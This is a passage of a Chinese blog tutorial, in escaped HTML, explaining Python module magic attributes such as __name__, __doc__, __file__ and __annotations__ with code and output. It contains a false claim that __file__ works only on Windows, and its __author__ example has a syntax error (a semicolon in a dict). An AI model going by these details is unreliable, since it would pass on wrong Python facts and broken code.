punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;####### 输出结果 #######&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__annotations__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__builtins__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__cached__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__doc__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__file__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__loader__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__name__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__package__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__spec__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;os&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;note warning&#34;&gt;
&lt;p&gt;这里有些内容不确定：&lt;br /&gt;
《python 网络编程从入门到精通》这本书上写原话是&lt;br /&gt;
 &lt;code&gt;可以看到隐式属性有[&#39;Test&#39;, &#39;__annotations__&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;os&#39;, &#39;var&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而在网上的&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s&#34;&gt; https://www.cnblogs.com/cwp-bg/p/9856339.html&lt;/span&gt; 博客中这样写的&lt;br /&gt;
 &lt;code&gt;可看到隐式的属性有__annotations__,__builtins__,__cached__,__annotations__,__doc__,__file__,__loader__,__name__;&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;我们打印一下每个魔法属性：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;doc......&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# print(dir())&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__name__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__annotations__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__builtins__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__cached__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__doc__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__file__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__loader__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__package__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__spec__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;######### 输出结果 ###############&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__main__&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;module &lt;span class=&#34;token string&#34;&gt;&#39;builtins&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;built&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;doc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;G&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;Text_Files&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;py&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1.&lt;/span&gt;py&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;_frozen_importlib_external&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SourceFileLoader &lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt; at &lt;span class=&#34;token number&#34;&gt;0x0000018C7E37F8B0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;## 空行是打印时就有的&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 其中__name__、__doc__、__file__、__package__是可以直接使用的，其它的内置属性一般不允许直接使用。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;内置魔法属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内置魔法属性&#34;&gt;#&lt;/a&gt; 内置魔法属性&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;_&lt;em&gt;name&lt;/em&gt;_&lt;br /&gt;
该属性代表当前模块的名字，每个 py 文件默认的属性，如果当前模块是主程序，值为 “&lt;strong&gt;main&lt;/strong&gt;”，如果不是主程序，值为模块名。这个属性经常用来区分主程序和作为被导入模块的程序。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;_&lt;em&gt;builtins&lt;/em&gt;_&lt;br /&gt;
该属性代表内置模块 builtins，即所有的内建函数、内置类型、内置异常等；在 python 执行一个 py 文件时，会将内置模块赋值给这个属性；如果不是主程序，那么这个属性是一个 builtins 模块所有方法的字典。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;_&lt;em&gt;doc&lt;/em&gt;_&lt;br /&gt;
模块的说明文档，py 文件初始化时，将文件开始的说明字符串赋值给这个属性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;_&lt;em&gt;file&lt;/em&gt;_&lt;br /&gt;
该属性代表文件的绝对路径，任何一个模块使用这个属性就可获得本模块的绝对路径；但是该属性只在 windows 环境下可用，在 linux 环境下不可用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;_&lt;em&gt;cached&lt;/em&gt;_&lt;br /&gt;
缓存文件，如果是主程序，那么该属性为 None，其他模块的该属性指向该模块的 pyc 字节文件，这样在 py 文件不发生修改的情况下可以减少编译的时间，更快地加载上下文环境。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;_&lt;em&gt;annotations&lt;/em&gt;_&lt;br /&gt;
该属性对于模块文件来说，没有开放给用户使用；但对于函数来说，这个方法用来记录参数的类型和返回值。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;get_sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; y&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;get_sum&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__annotations__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#输出结果 &amp;#123;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;get_sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; y&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; y&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;get_sum&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__annotations__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# &amp;#123;&#39;y&#39;: &amp;lt;class &#39;int&#39;&gt;, &#39;return&#39;: &amp;lt;class &#39;int&#39;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;函数的参数和返回值如果在定义的时候指定了类型，那么它们就会以键值对的形式记录到函数的__annotations__属性中，但对于匿名函数来说，这个属性是不存在的。&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;
&lt;p&gt;_&lt;em&gt;loader&lt;/em&gt;_&lt;br /&gt;
该属性 py3.3 之前没有，引用了本模块的加载器对象，即该模块的上下文是由这个加载器加载到内存中的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;_&lt;em&gt;package&lt;/em&gt;_&lt;br /&gt;
该属性是一个文件是否是包的标志，在主程序中该属性的值永远是 None，不要使用它；当一个包被导入到主程序中，该包的__package__属性为包的名字。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;__init__&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;py&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# main.py&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__package__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;9&#34;&gt;
&lt;li&gt;&lt;em&gt;spec&lt;/em&gt;&lt;br /&gt;
 该属性记录一个模块的详细信息，是一个 ModuleSpec 对象，&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;其他魔法属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他魔法属性&#34;&gt;#&lt;/a&gt; 其他魔法属性&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;author&lt;/em&gt;&lt;br /&gt;
 该属性用来定义模块的作者信息，可以是字符串，也可以是列表、字典等数据结构。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 可以在 python 文件中加入&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__author__ &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;auth&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1asy&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;bg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;https://self-ferry.github.io/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 